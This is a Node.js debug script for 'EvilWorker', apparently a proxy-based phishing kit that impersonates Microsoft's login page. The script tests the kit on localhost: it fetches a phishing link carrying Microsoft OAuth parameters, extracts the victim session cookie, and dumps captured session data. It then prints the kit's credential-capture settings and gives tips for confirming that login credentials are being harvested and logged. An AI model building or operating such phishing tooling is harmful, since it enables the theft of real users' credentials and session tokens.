const https = require('https');

// Debug script to test credential capture
async function debugCredentials() {
    console.log('🔍 Debugging EvilWorker Credential Capture\n');
    
    const baseUrl = 'http://localhost:3000';
    
    // Test 1: Check if server is running
    console.log('1. Testing server status...');
    try {
        const response = await fetch(`${baseUrl}/`);
        const data = await response.json();
        console.log(`✅ Server running: ${data.status}\n`);
    } catch (error) {
        console.log(`❌ Server not responding: ${error.message}\n`);
        return;
    }
    
    // Test 2: Test phishing link
    console.log('2. Testing phishing link...');
    try {
        const phishingUrl = `${baseUrl}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;
        const response = await fetch(phishingUrl);
        const cookies = response.headers.get('set-cookie');
        
        if (cookies) {
            console.log('✅ Phishing link: Session cookie set');
            console.log(`🍪 Cookie: ${cookies}\n`);
            
            // Extract session ID from cookie
            const sessionMatch = cookies.match(/([^=]+)=([^;]+)/);
            if (sessionMatch) {
                const sessionId = sessionMatch[1];
                console.log(`📋 Session ID: ${sessionId}\n`);
                
                // Test 3: Check session data
                console.log('3. Checking session data...');
                try {
                    const sessionResponse = await fetch(`${baseUrl}/session-debug`, {
                        headers: {
                            'Cookie': `${sessionId}=${sessionMatch[2]}`
                        }
                    });
                    const sessionData = await sessionResponse.json();
                    console.log('📊 Session Data:');
                    console.log(JSON.stringify(sessionData, null, 2));
                    console.log('\n');
                } catch (error) {
                    console.log(`❌ Session debug failed: ${error.message}\n`);
                }
            }
        } else {
            console.log('❌ Phishing link: No session cookie set\n');
        }
    } catch (error) {
        console.log(`❌ Phishing link failed: ${error.message}\n`);
    }
    
    // Test 4: Configuration check
    console.log('4. Checking configuration...');
    try {
        const config = require('./config');
        console.log('⚙️ Current Configuration:');
        console.log(`   • Credential redirect enabled: ${config.credentials.enableRedirect}`);
        console.log(`   • Redirect URL: ${config.credentials.redirectUrl}`);
        console.log(`   • Credential keywords: ${config.credentials.credentialKeywords.join(', ')}`);
        console.log(`   • Credential fields: ${config.credentials.credentialFields.join(', ')}`);
        console.log(`   • Login endpoints: ${config.credentials.loginEndpoints.join(', ')}\n`);
    } catch (error) {
        console.log(`❌ Configuration check failed: ${error.message}\n`);
    }
    
    console.log('🔧 Troubleshooting Tips:');
    console.log('   1. Check console logs for [CREDENTIAL_DETECTED] messages');
    console.log('   2. Visit /session-debug endpoint to see captured data');
    console.log('   3. Look for [LOGIN_DETECTED] messages in console');
    console.log('   4. Check phishing_logs/ directory for encrypted logs');
    console.log('   5. Try submitting a login form to trigger credential capture');
}

// Run the debug
debugCredentials().catch(console.error);
